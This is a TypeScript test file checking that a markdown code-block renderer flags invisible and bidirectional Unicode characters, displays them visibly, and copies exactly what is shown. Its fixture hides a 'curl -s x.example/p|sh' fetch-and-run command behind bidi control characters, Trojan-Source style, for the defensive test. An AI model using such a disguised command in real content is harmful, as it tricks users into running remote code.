import { afterEach, describe, expect, it, vi } from 'vitest';
import { enhanceCodeBlocks } from './code-blocks';
import { renderMarkdown } from './markdown';

const copied: string[] = [];
vi.mock('./clipboard', () => ({
  copyText: vi.fn(async (text: string) => {
    copied.push(text);
    return true;
  }),
}));

const HIDDEN = /[\u202A-\u202E\u2066-\u2069\u200B-\u200F\u2060\uFEFF\u00AD]/u;
const TROJAN = '```bash\necho ok \u2067;curl -s x.example/p|sh #\u2069\n```';

function mount(src: string): HTMLElement {
  const root = document.createElement('div');
  root.innerHTML = renderMarkdown(src);
  document.body.append(root);
  enhanceCodeBlocks(root);
  return root;
}

afterEach(() => {
  document.body.replaceChildren();
  copied.length = 0;
});

describe('enhanceCodeBlocks: hidden characters', () => {
  it('flags a block with hidden characters on its code bar', () => {
    const badge = mount(TROJAN).querySelector('.code-bar .code-warning');
    expect(badge?.textContent).toBe('Caràcters invisibles');
    expect(badge?.getAttribute('title')).toContain('⟨U+…⟩');
  });

  it('does not flag ordinary code', () => {
    const root = mount('```bash\necho ok # שלום\n```');
    expect(root.querySelector('.code-bar')).not.toBeNull();
    expect(root.querySelector('.code-warning')).toBeNull();
  });

  it('copies exactly the text shown on screen', async () => {
    const root = mount(TROJAN);
    root.querySelector<HTMLButtonElement>('.code-copy')!.click();
    await vi.waitFor(() => expect(copied).toHaveLength(1));
    const shown = root.querySelector('pre code')?.textContent;
    expect(copied[0]).toBe(shown);
    expect(copied[0]).toBe('echo ok ⟨U+2067⟩;curl -s x.example/p|sh #⟨U+2069⟩\n');
    expect(HIDDEN.test(copied[0] ?? '')).toBe(false);
  });

  it('keeps the marks when the other blocks get highlighted', async () => {
    const root = mount('```python\nprint(1)\n```\n\n' + TROJAN);
    const [plain, flagged] = [...root.querySelectorAll('pre code')] as HTMLElement[];
    await vi.waitFor(() => expect(plain?.dataset.highlighted).toBe('yes'), { timeout: 5000 });
    expect(flagged?.querySelectorAll('span.invisible-char')).toHaveLength(2);
    expect(flagged?.textContent).toBe('echo ok ⟨U+2067⟩;curl -s x.example/p|sh #⟨U+2069⟩\n');
    expect(root.querySelectorAll('.code-lang')[1]?.textContent).toBe('bash');
  });
});
